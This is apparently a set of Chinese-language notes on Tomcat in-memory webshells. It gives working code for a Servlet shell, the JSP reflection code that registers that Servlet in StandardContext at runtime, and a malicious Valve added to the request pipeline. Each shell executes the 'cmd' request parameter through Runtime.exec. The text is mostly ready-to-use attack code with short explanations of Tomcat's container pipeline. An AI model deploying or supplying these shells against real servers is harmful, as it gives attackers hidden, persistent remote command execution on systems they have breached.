## Servlet内存马

Servlet

```
package com.example.demo;  
  
import javax.servlet.ServletException;  
import javax.servlet.http.HttpServlet;  
import javax.servlet.http.HttpServletRequest;  
import javax.servlet.http.HttpServletResponse;  
import java.io.IOException;  
  
public class Servletshell extends HttpServlet {  
    @Override  
    public void init() throws ServletException {  
    }  
  
    @Override  
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {  
        String cmd = req.getParameter("cmd");  
        if(cmd != null) {  
            Runtime.getRuntime().exec(cmd);  
        }  
    }  
  
    @Override  
    public void destroy() {  
    }  
}
```

web.xml

```
<?xml version="1.0" encoding="UTF-8"?>  
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"  
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"  
         version="4.0">  
<servlet>  
    <servlet-name>Test</servlet-name>  
    <servlet-class>com.example.demo.Servletshell</servlet-class>  
</servlet>  
        <servlet-mapping>  
        <servlet-name>Test</servlet-name>  
        <url-pattern>/*</url-pattern>  
    </servlet-mapping>    </web-app>
```

### 内存马

注册Servlet

```
<%  
    ServletContext servletContext = request.getServletContext();  
    Field context = servletContext.getClass().getDeclaredField("context");  
    context.setAccessible(true);  
    ApplicationContext applicationContext = (ApplicationContext) context.get(servletContext);    Field context2 = applicationContext.getClass().getDeclaredField("context");  
    context2.setAccessible(true);  
    StandardContext standardContext = (StandardContext) context2.get(applicationContext);    Wrapper wrapper = standardContext.createWrapper();    wrapper.setServlet(new Servletshell());  
    wrapper.setServletClass(Servletshell.class.getName());  
    wrapper.setName("Test");  
    standardContext.addChild(wrapper);    standardContext.addServletMappingDecoded("/*", "Test");  
%>
```

恶意Servlet

```
<%  
    class Servletshell extends HttpServlet {  
        @Override  
        public void init() throws ServletException {  
        }  
        @Override  
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {  
            String cmd = req.getParameter("cmd");  
            if(cmd != null) {  
                Runtime.getRuntime().exec(cmd);  
            }        }  
        @Override  
        public void destroy() {  
        }    }%>
```

## Valve内存马

Valve译文为阀门。在Tomcat中，四大容器类StandardEngine、StandardHost、StandardContext、StandardWrapper中，都有一个管道(PipeLine)及若干阀门(Valve)。它们各自拥有独立的管道PipeLine，当各个容器类调用getPipeLine().getFirst().invoke(Request req, Response resp)时，会首先调用用户添加的Valve，最后再调用缺省的Standard-Valve形象地打个比方，供水管道中的各个阀门，用来实现不同的功能，比方说控制流速、控制流通等等

注册Valve

```
<%  
  Field request1 = request.getClass().getDeclaredField("request");  
  request1.setAccessible(true);  
  Request request2 = (Request) request1.get(request);  StandardContext context = (StandardContext) request2.getContext();  Pipeline pipeline = context.getPipeline();  Valvashell valve = new Valvashell();  
  pipeline.addValve(valve);%>
```

恶意Valve

```
<%  
  class Valvashell extends ValveBase {  
    @Override  
    public void invoke(Request request, Response response) throws IOException, ServletException {  
      String cmd = request.getParameter("cmd");  
      if(cmd != null) {  
        Runtime.getRuntime().exec(cmd);  
      }    }  }%>
```